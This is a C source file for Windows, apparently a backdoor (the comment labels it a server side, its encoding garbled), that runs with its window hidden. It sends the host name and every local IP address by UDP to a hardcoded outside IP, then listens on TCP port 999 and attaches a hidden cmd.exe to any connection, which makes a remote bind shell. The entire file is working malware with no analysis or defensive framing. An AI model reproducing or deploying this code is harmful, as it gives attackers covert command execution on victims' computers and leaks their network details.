//�ͷ��ˣ�

#include<stdio.h>
#include<string.h>
#include<Winsock2.h>
#include <windows.h>
#include<time.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#define MasterPort 999  //��������˿�999
int main()
{
	WSAData wsaData;
	int err=WSAStartup(WINSOCK_VERSION,&wsaData);
	if(0!=err)
	{
		return -1;
	}
	SOCKET sock;
	sock=socket(AF_INET,SOCK_DGRAM,0);
	if(INVALID_SOCKET==sock)
	{
		printf("socket()Failed:%d\n",WSAGetLastError());
		WSACleanup();
		return -1;
	}
	
	char dest_ip[]="222.196.200.150";      //Ŀ��IP
	unsigned short dest_port=20000;//Ŀ�Ķ˿�
	
	sockaddr_in RemoteAddr;
	RemoteAddr.sin_family = AF_INET;
	RemoteAddr.sin_port = htons(dest_port);
	RemoteAddr.sin_addr.s_addr=inet_addr(dest_ip);

	char host_name[255];
	//��ȡ������������
	if (gethostname(host_name, sizeof(host_name)) == SOCKET_ERROR) 
	{
		printf("Error %d when getting local host name.", WSAGetLastError());
		return 1;
	}

	int sByte = sendto(sock,host_name,strlen(host_name),0,(sockaddr*)&RemoteAddr,sizeof(RemoteAddr));
	if(SOCKET_ERROR==sByte)
	{
		printf("sendto()Failed:%d\n",WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return -1;
	}
	
	//�����������ݿ��еõ���Ӧ�ġ�������
	struct hostent *phe = gethostbyname(host_name);
	if (phe == 0) 
	{
		printf("Yow! Bad host lookup.");
		return 1;
	}
	
	//ѭ���ó����ػ�������IP��ַ
	for (int i = 0; phe->h_addr_list[i] != 0; ++i) 
	{
		struct in_addr addr;
		memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));
		//printf("Address %d : %s\n" , i, inet_ntoa(addr));
		Sleep(500);
		int sByte = sendto(sock,inet_ntoa(addr),strlen(inet_ntoa(addr)),0,(sockaddr*)&RemoteAddr,sizeof(RemoteAddr));
		if(SOCKET_ERROR==sByte)
		{
			printf("sendto()Failed:%d\n",WSAGetLastError());
			closesocket(sock);
			WSACleanup();
			return -1;
		}
	}
    closesocket(sock);
    WSACleanup();


	WSADATA WSADa;
	sockaddr_in SockAddrIn;	
	SOCKET CSocket,SSocket;	
	int iAddrSize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	char szCMDPath[255];
	
	//�����ڴ���Դ����ʼ�����ݣ�
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&WSADa, sizeof(WSADATA));
	
	 
	
	//��ȡcmd·��
	GetEnvironmentVariable("COMSPEC",szCMDPath,sizeof(szCMDPath));
	//����ws2_32.dll��
	WSAStartup(0x0202,&WSADa);
	
	 
	
	//���ñ�����Ϣ�Ͱ�Э�飬����socket����������
	SockAddrIn.sin_family = AF_INET;
	SockAddrIn.sin_addr.s_addr = INADDR_ANY;
	SockAddrIn.sin_port = htons(MasterPort);
	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	 
	
	//���ð󶨶˿�999��
	bind(CSocket,(sockaddr *)&SockAddrIn,sizeof(SockAddrIn));
	 //���÷������˼����˿ڣ�
	listen(CSocket,1);
	
	iAddrSize = sizeof(SockAddrIn);
	
	//��ʼ����Զ�̷����������������ش��ڽṹ�壺
	SSocket = accept(CSocket,(sockaddr *)&SockAddrIn,&iAddrSize);
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES |
	STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = (HANDLE)SSocket;
	StartupInfo.hStdOutput = (HANDLE)SSocket;
	StartupInfo.hStdError = (HANDLE)SSocket;
	
	//���������ܵ���
	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	//�رս��̾����
	closesocket(CSocket);
	closesocket(SSocket);
	WSACleanup();
	
	//�ر�����ж��ws2_32.dll
	return 0;
}